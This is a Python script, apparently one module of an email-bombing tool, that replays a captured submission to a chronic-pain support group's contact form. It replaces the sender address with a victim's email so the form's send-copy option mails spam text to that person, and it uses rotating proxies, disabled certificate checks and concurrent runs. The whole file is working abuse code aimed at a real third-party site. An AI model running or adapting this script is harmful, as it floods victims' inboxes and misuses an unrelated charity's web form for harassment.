from os.path import basename

import requests

from module import Spam

cookies = {
    '8100b2bc0c0e001da41437b5d0094154': '287c271298cbf506573faff8dbd872f2',
}

headers = {
    'Host': 'www.chronicpainsupportgroup.co.uk',
    # 'Content-Length': '739',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://www.chronicpainsupportgroup.co.uk',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryaY9JuIcGQNCk5Skh',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.chronicpainsupportgroup.co.uk/index.php/contact-us',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '8100b2bc0c0e001da41437b5d0094154=287c271298cbf506573faff8dbd872f2',
}

params = {
    'chronoform': 'ContactFormNew',
    'event': 'submit',
}

s = 'This is an'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="Name"\r\n\r\nname\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="Subject"\r\n\r\ntest\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="Message"\r\n\r\ntest\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="SendCopy"\r\n\r\n1\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="Validation"\r\n\r\naa\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh\r\nContent-Disposition: form-data; name="Submit"\r\n\r\nSubmit\r\n------WebKitFormBoundaryaY9JuIcGQNCk5Skh--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://www.chronicpainsupportgroup.co.uk/index.php/contact-us',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data.encode(),
            verify=False,
            proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
